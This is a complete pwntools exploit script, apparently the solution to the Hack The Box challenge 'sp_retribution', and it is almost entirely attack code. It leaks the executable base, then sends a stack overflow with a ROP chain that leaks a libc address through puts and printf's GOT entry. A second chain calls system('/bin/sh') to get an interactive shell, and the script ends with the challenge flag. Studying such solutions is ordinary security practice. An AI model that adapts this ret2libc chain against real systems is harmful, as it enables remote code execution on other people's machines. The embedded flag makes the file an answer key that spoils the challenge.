#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import binascii 

exe = context.binary = ELF('sp_retribution')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("1.1.1.1", 30709)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break missile_launcher
continue
'''.format(**locals())

io = start()
io.recvuntil(b'>>')

# Leak base addr of executable
io.sendline(b'2')
io.recvuntil(b"[*] Insert new coordinates: x = [0x53e5854620fb399f], y = ")
io.sendline(b'')
io.recvuntil(b'y = ')
io.recvline()
leak = io.recvline().hex()
log.info('Full leak: ' + leak)

leak = leak[:10]
exe_base = int(leak, 16)
exe_base = int(p64(exe_base).hex(), 16)
exe_base = (exe_base >> 16) - 0x0d00
log.info('Base of exe: ' + hex(exe_base))

# Try to leak libc addrs
puts_plt = exe_base + exe.plt['puts']
main_plt = exe_base + exe.symbols['main']
log.info("main start: " + hex(main_plt))
log.info("puts plt: " + hex(puts_plt))

# Get GOT addr for printf
printf_got = exe_base + exe.got['printf']
log.info("printf got: " + hex(printf_got))

# Get pop rdi; ret gadget 
# 0x0000000000000d33 : pop rdi ; ret
pop_rdi = exe_base + 0xd33
log.info("Pop rdi:  " + hex(pop_rdi))

# Leak libc addr
io.recvuntil(b"[*] Verify new coordinates? (y/n): ")
payload = b'A'*88 + p64(pop_rdi) + p64(printf_got) + p64(puts_plt) + p64(main_plt) 
io.sendline(payload)
print(io.recvuntil(b"Coordinates have been reset!"))
io.recvline()

received = io.recvline().strip()
print(received)
libc_leak = u64(received.ljust(8, b"\x00"))
log.info("leaked libc address, printf " + ": " + hex(libc_leak))

# Get addr of system, /bin/sh
libc = ELF('./glibc/libc-2.23.so')
libc.address = libc_leak - libc.sym["printf"]
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym["system"]

log.info("Addr of libc base:  " + hex(libc.address))
log.info("Addr of system:  " + hex(system))
log.info("Addr of /bin/sh:  " + hex(bin_sh))

# Send actual payload 
io.recvuntil(b'>>')
io.sendline(b'2')

io.recvuntil(b"[*] Insert new coordinates: x = [0x53e5854620fb399f], y = ")
io.sendline(b'')

io.recvuntil(b'y = ')
io.recvline()
io.recvline()

io.recvuntil(b"[*] Verify new coordinates? (y/n): ")
payload = b'A'*88 + p64(pop_rdi) + p64(bin_sh) + p64(system) 
io.sendline(payload)

io.interactive()

# HTB{d0_n0t_3v3R_pr355_th3_butt0n}

